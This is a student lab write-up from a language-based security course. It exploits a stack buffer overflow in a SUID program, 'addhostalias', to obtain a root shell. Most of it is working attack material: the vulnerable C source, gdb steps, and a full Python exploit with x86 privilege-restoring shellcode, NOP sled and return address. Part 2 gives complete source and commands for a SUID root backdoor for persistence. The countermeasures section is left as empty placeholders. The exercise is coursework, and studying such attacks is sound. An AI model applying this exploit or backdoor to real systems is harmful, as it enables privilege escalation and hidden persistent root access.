# Language-based Security

## Lab 2 - Buffer Overrun

### Part 1 : Gaining root access

#### How does it work ?

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- analyse the vulnerability in the code.
- use gdb to analyse how the program behaves according to the arguments that we give.
- find a way to exploit it. In our case, we will use Python which allows us to have our root shell more easily. Since it is a high level language, we can focus on the content of our malicious code instead of how to generate it.

First of all, let's see the content of addhostalias program. We have to run it by giving three arguments, IP address, host and alias, and the program will load these values into a buffer, and load into a new line into the hosts file, located in /etc folder.

```c

#include <stdio.h>
#include <stdlib.h>
 
 
#define HOSTNAMELEN 256
#define IPADDR      1
#define HOSTNAME    2
#define ALIAS       3
 
#define HOSTFILE "/etc/hosts"
 
 
void add_alias(char *ip, char *hostname, char *alias) {
  char formatbuffer[256];
  FILE *file;
 
  sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias); // sprintf doesn't check if formatbuffer variable can be bound into 256 bytes, we are going to exploit this section
 
  file = fopen(HOSTFILE, "a");
  if (file == NULL) {
    perror("fopen");
    exit(EXIT_FAILURE);
  }
 
  fprintf(file, formatbuffer);
  if (fclose(file) != 0) {
    perror("close");
    exit(EXIT_FAILURE);
  }
}
 
 
int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s ipaddress hostname alias \n", argv[0]);
    exit(EXIT_FAILURE);
  }
 
  add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);
  return(0);
}

```

Here, we are going to exploit the sprintf function, which in our case fill the buffer with these three arguments, with a space - the \t character - between each string. The problem is that this function doesn't check if the size of the final string is inferior or equal to the max length of our variable (formatbuffer in the program above). At the end, every string can be put in this variable, even if we define a size of 256 bytes during the allocation.
With this behavior, we can combine this sprintf function property, with adequate parameters, in order to fill machine memory with malicious code, that's what we call a buffer overflow, which is based on the memory managment into computers. To better understand what will happen next, let's have a brief explanation of how the stack works in this type of program. In order to maintain consistency during program execution, OS stores everything that is necessary for the program to work in memory. This means it can push data in a stack, but also store addresses that point to other memory locations (for example when a function call is performed). The schema below show a simplified view of memory layout:

```
       0xffffffff

   4 bytes (32bits OS)
< --------------------->


 ----------------------
|   RETURN ADDRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       STACK          |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0x00000000

```

During execution of a program, OS uses variables or parameters, that will be stored into the stack, that grows downwards ; it also uses return address, to know where to go in memory to continue the execution, and also some pointers. Most famous are EBP which is base pointer and ESP, stack pointer.

In reality, memory management is more complicated, since it relies on some registers that store some more addresses into registers in order to the program to run correctly. Memory also contains a heap that can also be exploited, but this type of exploit are less performed.

Also, the last important point is that the SUID bit is set, so the program is vulnerable. When a user runs this program, his EUID (effective user id) becomes the same as root. This is necessary to have the possibility to edit the /etc/hosts file, where root only has the right to write to. In this case, The SUID bit is mandatory in order for `addhostalias` to work properly.


#### How did we create our exploit ?

To create our malicious input in an efficient way, we used GDB, to see if everything where fine in memory management during program execution:

- `gdb --args addhostalias <param1> <param2> <param3> ` entering debug mode for our program.
- `(gdb) break fopen` place a break point to stop the program's execution when fopen function is called. In our case it will stop just after the buffer has been written to memory.
- `(gdb) run` run the program until it finishes or when a breakpoint is reached.
- `(gdb) x/100x $sp` display 100 current words in our memory where the stack pointer is located. This allows us to analyse the current stack state once our buffer is written with our three arguments.

On the figure below you can see these differents steps executed as an example, and also the result in memory:
![How to use GDB to craft our exploit](/assets/lab2/gdb-demo.png)

We now have to create an input that fulfills these requirements:
- size of 264 bytes, to fill perfectly into the current stack size (256B) plus the base pointer (32bits, so 4B) and the return address (4B for the same reason)
- beginning of the buffer is a series of NOP instructions, because in a computer things tend to move slightly, and you cannot ensure that you malicious code will permanently be located in a fixed address. It will create a sort of slope, that will redirect into the malicious code (since NOP instruction just tells the program to continue execution into the next address in memory)
- malicious code, in our case that spawn a shell as the current effective user, root in this case. The SUID bit configured on `addhostalias` gives us the opportunity to execute the commands described in the shellcode with the necessary root permissions. These instructions allow us to launch a root shell after the execution of the program. If we didn't set the real used id and the real group id as the effective user id (root) during the execution of the program, we would lose our root permissions before entering the called shell and have access to a normal user's shell instead.
- return address that returns to our series of NOP instructions

The layout of the exploit thus will be:
```

 ----------------------
|   RETURN ADDRESS     | <------- now redirects approximately to the end of the stack (in the NOP slide inserted inside the buffer)
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it is now overwritten with NOPs
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

At the end, the final python code is:
```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 (NOPs) + 75 (Shellcode) + 2 (separators between addhostalias arguments) + 2 (last 2 bytes for base pointer occupied by 2 NOPs)+ 4 (return address) = 264 bytes of data (instead of 256, so it will overwrite the base pointer and the return address)
print nops+shellcode,nop*2,nop_adress
```

Let's run the program in GDB and see what happens
![Steps of our buffer overflow](/assets/lab2/buffer-overflow.png)




### Part 2 : Create a Backdoor

Once we have access to a root shell, we need to create a backdoor in order to be able to log as root easily the next time we need to.
To do that, all we need is to create a c file called `backdoor.c`for exemple:

```c 
#include<stdlib.h>
main () {
setuid(0);
system("/bin/bash");
}
```

Then we need to compile it with gcc: `gcc -o backdoor backdoor.c`.
Finally, we have to set the suid bit: `chmod u+s backdoor` and verify that group and others have the execute permission.

Now, when we execute`./backdoor` with the user dvader, we gain access to a root shell.

### Part 3 : Countermeasures

- Canaries : ...
- NX bit : ...
- ASLR : ...


### Sources that helped us gaining root access on the machine

1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
3. [Le Débogueur GDB, Anne Canteaut](https://www.rocq.inria.fr/secret/Anne.Canteaut/COURS_C/gdb.html)






